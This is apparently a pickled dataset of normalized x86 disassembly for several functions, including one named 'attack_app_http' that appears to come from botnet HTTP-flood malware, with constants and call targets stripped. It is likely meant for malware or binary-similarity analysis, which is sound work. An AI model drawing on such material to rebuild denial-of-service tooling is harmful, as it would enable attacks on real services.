(lp0
(S'_init'
p1
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nCALL~FOO\nADD~EBX,0\nCALL~FOO\nCALL~FOO\nPOP~EBX\nPOP~EBP\nRETN"'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'"PUSH~EBP\nMOV~EBP,ESP\nSUB~ESP,0\nCMP~<STR>,0\nJZ~FOO\nJMP~FOO\nADD~EAX,0\nMOV~<STR>,EAX\nCALL~EDX\nMOV~EAX,<STR>\nMOV~EDX,[EAX]\nTEST~EDX,EDX\nJNZ~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nLEAVE\nRETN"'
p5
L72L
tp6
a(S'frame_dummy'
p7
S'"PUSH~EBP\nMOV~EAX,0\nMOV~EBP,ESP\nSUB~ESP,0\nCALL~FOO\nPOP~EDX\nADD~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~EAX\nADD~ESP,0\nLEAVE\nRETN"'
p8
L81L
tp9
a(S'_start'
p10
S'"XOR~EBP,EBP\nPOP~ESI\nMOV~ECX,ESP\nAND~ESP,0\nPUSH~EAX\nPUSH~ESP\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~ESI\nPUSH~0\nCALL~FOO"'
p11
L33L
tp12
a(S'attack_app_http'
p13
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOVZX~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nPUSH~0\nMOV~EDI,EAX\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nADD~ECX,[ESP+0]\nMOV~DL,[ECX]\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nLEA~EAX,[EDX-0]\nMOV~[ECX],AL\nINC~[ESP+0]\nMOV~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EBX,EAX\nJL~FOO\nMOV~[ESP+0],EDI\nCMP~EDI,0\nJLE~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~[ESP+0],0\nMOV~ESI,EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~[ESI+0],0\nMOV~DWORDPTR[ESI],0\nMOVZX~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~ECX,EDX\nCDQ~,\nIDIV~,ECX\nIMUL~EDX,,0\nMOV~EDI,[ESP+0]\nLEA~EBP,[ESI+0]\nADD~EDI,EDX\nMOV~EAX,[EDI+0]\nMOV~[ESI+0],EAX\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nCMP~[ESI+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EBP\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~EAX,[ESI+0]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESI+0]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[EDI+0],0\nJA~FOO\nMOV~EBX,[EDI+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOVZX~ECX,[EDI+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nCMP~EDX,0\nJA~FOO\nLEA~EBX,[ESI+0]\nJMP~<STR>\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBP\nCALL~FOO\nINC~[ESP+0]\nADD~ESI,0\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDX,0\nMOV~[ESP+0],EAX\nLEA~EDI,[ESP+0]\nXOR~EAX,EAX\nMOV~ECX,EDX\nCLD\nSTOSD~,\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nADD~ESI,0\nADD~ESP,0\nJMP~FOO\nMOV~AL,[ESI-0]\nLEA~EBP,[ESI-0]\nCMP~AL,0\nJNZ~FOO\nCMP~[ESI+0],0\nJZ~FOO\nMOV~[ESI-0],0\nJMP~FOO\nMOV~[ESI-0],0\nJMP~FOO\nTEST~AL,AL\nJNZ~FOO\nCLD\nXOR~EAX,EAX\nLEA~EDI,[ESP+0]\nSTOSD~,\nSTOSD~,\nSTOSD~,\nSTOSD~,\nMOV~EAX,[ESI-0]\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[ESI-0],EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EBP\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~[ESI-0]\nCALL~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESI-0]\nCALL~FOO\nMOV~EAX,[ESI]\nMOV~[ESP+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nMOV~EAX,[ESP+0]\nMOV~[ESI-0],EAX\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nADD~ESP,0\nMOV~[ESI-0],0\nPUSH~0\nPUSH~EAX\nPUSH~[ESI-0]\nCALL~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nADD~ESP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nSUB~EAX,[ESI-0]\nCMP~EAX,0\nJA~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nLEA~EAX,[EBP+0]\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nPOP~ECX\nPOP~EBX\nPUSH~0\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nLEA~EDX,[EBP+0]\nMOV~[ESP],EDI\nMOV~[ESP+0],EDX\nCALL~FOO\nPOP~EBX\nPOP~EDX\nLEA~EAX,[EDI+EAX]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~ECX\nLEA~EDX,[EBP+0]\nPOP~EBX\nLEA~EAX,[EDI+EAX]\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EBX\nPOP~EDX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nLEA~EDX,[EBP+0]\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EBX\nPOP~EDX\nLEA~EAX,[EDI+EAX]\nLEA~EDX,[EBP+0]\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EDI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EDI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EDI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EDI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EDI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[EDI+EBX]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESI+0],0\nJLE~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nPOP~EBX\nPOP~EDX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nSHL~EBX,0\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nPOP~EDX\nLEA~EDX,[EBX+EBP+0]\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EBX,[ESP+0]\nLEA~EDI,[ESP+0]\nCMP~EBX,[ESI+0]\nJL~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nPOP~EBX\nPOP~EDX\nLEA~EAX,[EDI+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EDI+EAX]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EBP+0]\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nPUSH~0\nPUSH~EAX\nPUSH~EDI\nPUSH~[ESI-0]\nCALL~FOO\nMOV~EAX,[ESI-0]\nMOV~ECX,[ESP+0]\nMOV~EDX,EAX\nMOV~[ESI-0],ECX\nMOV~[ESI-0],0\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nADD~ESP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nSUB~ESP,0\nMOV~[ESI-0],0\nPUSH~[ESI-0]\nCALL~FOO\nMOV~[ESI-0],0\nADD~ESP,0\nINC~[ESP+0]\nADD~ESI,0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJL~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EBX,EBX\nJLE~FOO\nMOV~EBP,[ESP+0]\nMOV~[ESP+0],0\nADD~EBP,0\nJMP~FOO\nLEA~EDX,[EBP-0]\nMOV~ECX,[EBP-0]\nMOV~[ESP+0],EDX\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nMOV~EDX,ECX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nOR~EAX,[ESP+0]\nJNZ~FOO\nMOV~[EBP-0],0\nMOV~EAX,[EBP-0]\nMOV~EDX,EAX\nSHR~EAX,0\nAND~EDX,0\nBT~[ESP+EAX*4+0],EDX\nSETB~DL\nTEST~DL,DL\nJZ~FOO\nMOV~AL,[EBP-0]\nCMP~AL,0\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~[EBP-0]\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nCMP~[ESP+0],0\nJLE~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EAX+0],0\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[EBP+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[EBP+0],0\nMOV~[EBP+0],0\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nXOR~EAX,EAX\nCMP~[ESP+EBX+0],0\nPUSH~0\nPUSH~0\nSETZ~AL\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],ESI\nMOV~EBX,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EBP+0],0\nMOV~[EBP+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nXOR~EAX,EAX\nCMP~[ESP+EBX+0],0\nPUSH~0\nPUSH~0\nSETZ~AL\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],ESI\nMOV~EBX,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EBP+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nXOR~EAX,EAX\nCMP~[ESP+EBX+0],0\nPUSH~0\nPUSH~0\nSETZ~AL\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~[EBP+0],EAX\nJMP~FOO\nMOV~[EBP+0],0\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nADD~EAX,[ESP+0]\nADD~ESP,0\nMOV~ECX,[ESP+0]\nMOV~ESI,[ESP+0]\nCMP~[EAX+ECX-0],0\nSETZ~AL\nMOVZX~EAX,AL\nSUB~ESI,[ESP+0]\nADD~ECX,EAX\nSUB~ESI,ECX\nLEA~EDI,[EBX+ECX]\nMOV~[ESP+0],ECX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,[ESP+0]\nADD~EAX,[ESP+0]\nADD~EDX,EAX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nCMP~EBX,0\nJLE~FOO\nSUB~EBX,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EAX-0]\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nADD~EAX,[ESP+0]\nMOV~[EAX+EBX-0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nCMP~BYTEPTR[ECX+EBX],0\nJZ~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nMOV~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EBX,EAX\nMOV~EBX,[ESP+0]\nJL~FOO\nMOV~EAX,[ESP+0]\nCMP~BYTEPTR[EAX+EBX],0\nJNZ~FOO\nMOV~[ESP+0],0\nJMP~FOO\nSHL~EAX,0\nPUSH~EDX\nPUSH~EBX\nMOV~EDX,[ESP+0]\nLEA~EAX,[EAX+EDX+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nINC~[ESP+0]\nMOV~EAX,[ESP+0]\nCMP~EAX,[EBP+0]\nJL~FOO\nJMP~FOO\nMOV~BYTEPTR[ECX],0\nJMP~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~[ESP+0]\nMOV~EAX,[EBP+0]\nMOV~ECX,[ESP+0]\nSHL~EAX,0\nLEA~EAX,[EAX+ECX+0]\nPUSH~EAX\nCALL~FOO\nINC~[EBP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nADD~[ESP+0],EAX\nPUSH~ESI\nPUSH~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nLEA~EBX,[ESP+0]\nADD~EBX,[ESP+0]\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nCMP~[EBP+0],0\nJLE~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO